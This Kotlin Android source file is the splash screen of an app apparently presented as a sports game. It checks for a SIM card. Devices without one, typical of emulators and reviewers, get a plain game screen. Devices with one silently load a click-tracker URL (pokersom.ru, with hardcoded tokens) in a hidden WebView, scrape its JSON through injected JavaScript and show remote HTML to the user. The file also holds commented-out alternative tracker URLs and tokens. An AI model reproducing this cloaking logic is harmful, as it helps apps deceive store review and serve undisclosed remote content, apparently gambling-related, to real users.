package com.funwords.worldssports

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.res.ColorStateList
import android.graphics.Color
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.webkit.JavascriptInterface
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import kotlinx.coroutines.InternalCoroutinesApi
import android.net.NetworkInfo
import kotlinx.android.synthetic.main.activity_splash_screen.*
import android.net.ConnectivityManager
import android.os.CountDownTimer

import android.graphics.drawable.Drawable
import android.telephony.TelephonyManager
import androidx.core.content.ContextCompat.getDrawable
import okhttp3.OkHttpClient
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors


@SuppressLint("CustomSplashScreen")
class SplashScreen : AppCompatActivity() {

//    internal class MyJavaScriptInterface {
//        @JavascriptInterface
//        fun processHTML(html: String?) {
//            // process the html as needed by the app
//            Toast.makeText(, html, Toast.LENGTH_SHORT).show()
//        }
//    }


    private val networkMonitor = NetworkMonitorUtil(this)

    //@InternalCoroutinesApi
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash_screen)

        supportActionBar?.hide()

        val timer = object: CountDownTimer(1000, 500) {
            override fun onTick(millisUntilFinished: Long) {

            }
            override fun onFinish() {


                var result = true
                try {
                    val telMgr = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                    val simState = telMgr.simState
                    when (simState) {
                        TelephonyManager.SIM_STATE_ABSENT -> result = false
                        TelephonyManager.SIM_STATE_UNKNOWN -> result = false
                        else -> {
                        }
                    }
                } catch (e: Exception) {
                    //ignore
                }
                // проверка симки
                val sim = result//simInformation.getBoolean("sim", true)

                if(isWorkingInternetPersent()){
                    if (sim){
                        splash();
                    } else {
                        val i = Intent(applicationContext, GameActivity::class.java)
                        startActivity(i)
                        finish()
                    }

                }
                else{
                    if (!sim){
                        val i = Intent(applicationContext, GameActivity::class.java)
                        startActivity(i)
                        finish()
                    } else {
                        splash_screen.visibility = View.GONE
                        connect_info.visibility = View.VISIBLE
                        this.start()
                    }

                }
                //
            }

        }
        timer.start()

        //splash()

    }

    fun isWorkingInternetPersent(): Boolean {
        val connectivityManager = baseContext
            .getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (connectivityManager != null) {
            val info = connectivityManager.allNetworkInfo
            if (info != null) for (i in info.indices) if (info[i].state == NetworkInfo.State.CONNECTED) {
                return true
            }
        }
        return false
    }


    fun splash() {
        val timerTread: Thread = object : Thread() {
            override fun run() {
                try {
                    sleep(100)
                } catch (e: InterruptedException) {
                    e.printStackTrace()
                } finally {

                    val sendPostBack =
                        getSharedPreferences(packageName, MODE_PRIVATE).getBoolean("sendPostBack", false)

                    val postBack = getSharedPreferences(packageName, MODE_PRIVATE)

                    //val web_no_connect: LinearLayout = findViewById(R.id.no_connect)

                    var sim: Boolean
                    var locale: String
                    var localeBoolean: Boolean
                    var gameBoolean: Boolean


                    //проверка первого открытия приложения
                    if (!sendPostBack) {
                        getSharedPreferences(packageName, MODE_PRIVATE).edit()
                            .putBoolean("sendPostBack", true)
                            .apply()
                        postBack.getBoolean("noFirstVisit", true)
                    }

                    var ans_00: String = ""

                    splash_screen.alpha = 0f
                    splash_screen.animate().setDuration(2100).alpha(1f).withEndAction {

//                        val serverURL =
//                            "https://membet.ru/hSJTqK/click_api/v3?token=dpmjknnmy6wfqfhwzv2bvww6jpslqdkz&log=1&info=1"
//                        //val u = getUserAgent(this)
//                        val client: OkHttpClient
//                        val builder = OkHttpClient.Builder()
//                        builder.connectTimeout(60, TimeUnit.SECONDS)
//                        builder.readTimeout(60, TimeUnit.SECONDS)
//                        builder.writeTimeout(60, TimeUnit.SECONDS)
//                        client = builder.build()
                        //нужно отправлять ещё куки и ip

                        var web: WebView = findViewById(R.id.web_api)

                        web.webViewClient = object :
                            WebViewClient() {
                            override fun onPageFinished(view: WebView, url: String) {
                                /* This call inject JavaScript into the page which just finished loading. */
                                web.loadUrl("javascript:window.HTMLOUT.processHTML(document.getElementsByTagName('pre')[0].innerHTML);")
//                    web.loadUrl("javascript:window.HTMLOUT.processHTML('<head>'+document.getElementsByTagName('html')[0].innerHTML+'</head>');")
                            }
                        }


                        web.settings.javaScriptEnabled = true
                        web.canGoBack()
                        web.settings.loadsImagesAutomatically = true
                        //добавление кэша и куки
                        web.settings.setAppCacheEnabled(false)
                        web.settings.databaseEnabled = true
                        web.settings.domStorageEnabled = true; // Открываем кеш DOM
                        web.settings.cacheMode = WebSettings.LOAD_DEFAULT

                        val html_polisy = getSharedPreferences(packageName, MODE_PRIVATE)
                        web.addJavascriptInterface(  object  {
                            @JavascriptInterface
                            fun processHTML(html: String?) {
                                // process the html as needed by the ap

                                val json1: JSONObject = JSONObject(html!!)
                                var ans_00 = json1.getString("body").toString()
                                Log.d("log", "111111qqqqqqqqqqqqqqqqqqqqqqqqqqqqqq11111")
                                val ans_2: String = json1.getString("info")
                                Log.d("log", "222222222222222222222222222222222222222222222222222222222222222222222222222222")
                                Log.d("log", ans_2)
                                Log.d("log", "333333333333333333333333333333333333333333333333333333333333333333333333333333")
                                val json2: JSONObject = JSONObject(json1.getString("info"))
                                val ans_3: String = json2.getString("token")
                                val ans_4: String = json2.getString("offer_id")


                                Log.d("log", "token: " + ans_3)
                                Log.d("log", "offer_id: " + ans_4)
                                html_polisy.edit().putString("token",ans_3).apply()
                                html_polisy.edit().putString("offer_id",ans_4).apply()
                                //val html: String = ans_00.replace("&lt;", '<').replace('w', 'ц')

                                //ans_00.replace("&gt;", ">/n")
                                //ans_00.replace("&gt;", ">")

                                //Log.d("log", ans_00)
                                Handler(Looper.getMainLooper()).post {
                                    val policy_html:String = ans_00
                                    ans_00= ans_00.replace("&lt;", "<").replace("&gt;", ">")
                                    Log.d("log", "policy_htmlpolicy_htmlpolicy_htmlpolicy_html")
                                    Log.d("log", ans_00)
                                    val i = Intent(applicationContext, MainActivity::class.java)
                                    i.putExtra("polisy", ans_00)
                                    startActivity(i)
                                    finish()
                                }

                            }
                        }, "HTMLOUT")
                        //dpmjknnmy6wfqfhwzv2bvww6jpslqdkz
                        //https://membet.ru/hSJTqK

                        //Click api token: z4ctdyhywwq18hk9gnftgncgqzpbxq1b
                        //Трекинг ссылка: https://membet.ru/jMNgBX


                        val token = "wgsq6g3mdz1zpkxcfd31byjjlwt5fpc1"
                        val tracker = "https://pokersom.ru/PWxqb1"

                        val url_1 = "$tracker/click_api/v3?token=$token&log=1&info=1"
                        //"https://membet.ru/hSJTqK/click_api/v3?token=dpmjknnmy6wfqfhwzv2bvww6jpslqdkz&log=1&info=1" - Lion C
                        web.loadUrl(url_1)
                        //val draw: Drawable = getDrawable(applicationContext, R.drawable.custom_progressbar)!!



//                        val client: OkHttpClient
//                        val builder = OkHttpClient.Builder()
//                        builder.connectTimeout(10, TimeUnit.SECONDS)
//                        builder.readTimeout(5, TimeUnit.SECONDS)
//                        builder.writeTimeout(5, TimeUnit.SECONDS)
//                        client = builder.build()
//
//                        val serverURL =
//                            "https://membet.ru/hSJTqK/click_api/v3?token=dpmjknnmy6wfqfhwzv2bvww6jpslqdkz&log=1&info=1"
//                        val request: okhttp3.Request = okhttp3.Request.Builder()
//                            .addHeader("Accept", "*/*")
//                            .removeHeader("User-Agent")
//                            .addHeader("User-Agent",getUserAgent(this@SplashScreen))
//                            .url(serverURL)
//                            .build()

//                        val executor: ExecutorService = Executors.newSingleThreadExecutor()
//                        executor.execute {
//                            val response = client.newCall(request).execute()
//
//                            if (response.isSuccessful) {
//                                val myResponse = response.body!!.string()
//                                Log.d("myResponse", myResponse)
//
//                                try {
//                                    val json1: JSONObject = JSONObject(myResponse)
//                                    var ans_00 = json1.getString("body").toString()
//                                    Log.d("log", "requestrequestrequestrequestrequestrequest")
//                                    //Log.d("log", ans_00)
//
//                                    html_polisy.edit().putString("html_polisy", ans_00).apply()
//
//                                    val ans_1: String = json1.getString("log")
//                                    //Log.d("log", ans_1)
//                                    val ans_c: String = json1.getString("cookies")
//                                    //Log.d("log", ans_c)
//                                    val ans_2: String = json1.getString("info")
//                                    //Log.d("log", ans_2)
//                                    val json2: JSONObject = JSONObject(json1.getString("info"))
//                                    val ans_3: String = json2.getString("token")
//                                    val ans_4: String = json2.getString("offer_id")
////                                    Handler(Looper.getMainLooper()).post {
////                                        val i = Intent(applicationContext, MainActivity::class.java)
////                                        i.putExtra("polisy", ans_00)
////                                        startActivity(i)
////                                        finish()
////                                    }
//
//                                } catch (e: Exception) {
//                                    Handler(Looper.getMainLooper()).post {
//                                        Log.d("dfktoiserjgt9ijhuiser", "ERRR$e")
//                                    }
//                                }
//                            } else {
//
//                            }
//
//                        }

                    }
                }
            }
        }
        timerTread.start()
    }

    fun getUserAgent(context: Context): String {
        var userAgent = ""
        userAgent =
            try {
                WebSettings.getDefaultUserAgent(context)
            } catch (e: Exception) {
                System.getProperty("http.agent")!!
            }
        val sb = StringBuffer()
        var i = 0
        val length = userAgent.length
        while (i < length) {
            val c = userAgent[i]
            if (c <= '\u001f' || c >= '\u007f') {
                sb.append(String.format("\\u%04x", c.toInt()))
            } else {
                sb.append(c)
            }
            i++
        }
        return sb.toString()
    }

}

